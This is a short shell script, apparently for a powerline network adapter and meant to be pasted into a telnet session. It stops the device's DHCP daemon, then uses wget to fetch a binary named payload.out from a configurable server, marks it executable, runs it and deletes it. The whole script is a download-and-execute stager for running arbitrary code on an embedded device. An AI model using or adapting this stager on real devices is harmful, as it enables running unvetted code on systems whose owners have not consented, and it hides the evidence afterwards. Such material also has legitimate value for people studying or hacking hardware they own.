#!/bin/sh
# Script to run on powerline to download payload and execute
# Pipe to telnet and execute, or paste into script
# Modify this line to your server's url
file_url="http://192.168.0.100:8000/payload.out"

# Stop running udhcpd, if it is running
killall udhcpd
cd /tmp
# Delete old payload if payload downloaded before
rm payload.out
wget "${file_url}" -O payload.out
chmod +x payload.out
./payload.out
rm payload.out
